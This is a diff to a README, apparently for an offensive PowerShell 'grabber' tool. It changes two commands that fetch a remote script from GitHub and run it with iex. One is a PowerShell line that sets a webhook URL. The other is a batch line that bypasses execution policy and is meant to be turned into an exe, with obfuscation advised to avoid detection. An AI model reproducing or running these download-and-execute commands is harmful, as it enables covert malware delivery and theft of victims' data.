@@ -40,12 +40,12 @@ To avoid detection, the following commands should be Encoded using [Obfuscation]
 
 #### Define HookUrl and use the payload as a powershell script
 ```powershell
-$hookurl="";iex((iwr https://github.com/MattOverthrow/PSGrabber/PSGrabber).content)
+$hookurl="";iex((iwr https://raw.githubusercontent.com/MattOverthrow/PSGrabber/main/PSGrabber.ps1).content)
 ```
 
 #### Convert to batch and then convert into an exe using a third party program
 ```batch
-powershell.exe -NoProfile -ExecutionPolicy bypass -Command "iex((iwr https://github.com/MattOverthrow/PSGrabber/PSGrabber).content)"
+powershell.exe -NoProfile -ExecutionPolicy bypass -Command "$hookurl="";iex((iwr https://raw.githubusercontent.com/MattOverthrow/PSGrabber/main/PSGrabber.ps1).content)"
 ```
 
 ## Acknowledgements
